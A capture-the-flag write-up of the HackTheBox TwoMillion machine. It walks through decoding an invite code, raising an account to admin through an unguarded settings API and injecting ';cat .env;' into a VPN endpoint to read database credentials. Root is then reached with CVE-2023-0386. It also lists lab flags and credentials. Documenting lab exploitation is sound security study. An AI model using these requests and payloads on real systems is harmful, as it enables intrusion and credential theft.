---
layout: page
title: "TwoMillion"
permalink: /writeups/
---

# HackTheBox: TwoMillion Writeup

## 1. Reconnaissance

We begin the enumeration phase with an Nmap scan, which reveals two open ports:

| Port   | Service |
| ------ | ------- |
| **22** | SSH     |
| **80** | HTTP    |

Browsing to port 80 reveals a hostname: `2million.htb`. After adding this to our `/etc/hosts` file, we are presented with an old-school HackTheBox landing page.

Directory fuzzing reveals several interesting endpoints:

- `/login`
- `/register`
- `/api`
- `/invite`
- `/home`

The main site lacks functionality, but navigating to `http://2million.htb/invite` brings us to a page where we can validate an invite code. Attempting to register at `/register` also requires this code.

---

## 2. Initial Foothold: Generating the Invite Code

On the `/invite` page, inspecting the source code reveals a minified and obfuscated JavaScript file: **`inviteapi.min.js`**.

After deobfuscating the script, we discover a hidden API endpoint: `/api/v1/invite/how/to/generate`. Sending an empty `POST` request to this endpoint returns a JSON response with a hint:

```json
{
  "0": 200,
  "success": 1,
  "data": {
    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr",
    "enctype": "ROT13"
  },
  "hint": "Data is encrypted ... We should probably check the encryption type in order to decrypt it..."
}
```

The `enctype: "ROT13"` is a clear indicator. Applying ROT13 to the data string yields:

> _"In order to generate the invite code, make a POST request to /api/v1/invite/generate"_

Following these instructions, we send a `POST` request to `/api/v1/invite/generate` and receive an encrypted string: `U1dWSVEtSkI1V0stM1I2TjUtQkZLRlI=`.

While this appears to be Base64 encoded at first glance, decoding it directly yields gibberish. The trick is to apply **ROT13** first, followed by **Base64 decoding**, which finally reveals our valid invite code: `SWVIQ-JB5WK-3R6N5-BFKFR`.

We can now register an account and authenticate.

- **Credentials:** `leftz@test.com` / `Password`

---

## 3. Web Application & API Enumeration

Authenticated access opens up three new endpoints:

- `/home/access`
- `/home/rules`
- `/home/changelog`

The **Rules** page warns users to operate HTB in a separate environment to avoid being hacked over the HTB Network (`10.10.10.0/24`). It also hints at the possibility of pivoting to other gateways and nodes.

The **Access** page provides details about our connection and exposes a new target endpoint: `/api/v1/user/vpn`. This endpoint allows us to generate or regenerate a `.ovpn` configuration file.

Sending a `GET` request directly to `/api/v1` returns a complete route mapping of the API:

```json
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

---

## 4. Privilege Escalation (User)

### Admin Account Takeover

Notice the `PUT` method for `/api/v1/admin/settings/update`. We can exploit this endpoint to elevate our privileges by setting our user account to an admin role.

```http
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
Cookie: PHPSESSID=nusha2pb992c9di6f5qor2orq0
Content-type: application/json
Content-Length: 49

{
  "email":"leftz@test.com",
  "is_admin":1
}

```

**Response:**

```json
{ "id": 13, "username": "leftz", "is_admin": 1 }
```

### Command Injection

Now operating as an admin, we have access to `/api/v1/admin/vpn/generate`. This endpoint takes a username to generate a VPN config, but it is vulnerable to **Command Injection**.

By injecting a semicolon (`;`), we can break out of the intended command execution context. Injecting `;ls -la;` reveals a `.env` file in the current directory. Modifying the payload allows us to read it:

**Payload:**

```json
{
  "username": ";cat .env;"
}
```

**Extracted `.env` contents:**

```text
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123

```

These database credentials are also valid for SSH. Logging in as `admin` via SSH grants us our first flag:
**User Flag:** `26617ceae701ee755eeaba29c4417210`

---

## 5. Privilege Escalation (Root)

Once on the box, standard local enumeration reveals an unread email in `/var/mail/admin`:

```bash
admin@2million:~$ cat /var/mail/admin
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700

Hey admin,

I know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather

```

The email explicitly mentions a vulnerability involving **OverlayFS and FUSE**. A quick search for recent vulnerabilities matching this description points to **CVE-2023-0386**.

Running `uname -a` confirms the machine is running a vulnerable kernel version.

To exploit this:

1. Locate a PoC for CVE-2023-0386.
2. Transfer the exploit to the target machine.
3. Compile and execute the payload to spawn a root shell.

Execution is successful, granting full system compromise.
**Root Flag:** `e579ea01b3f9324fdf984ba32172d81e`
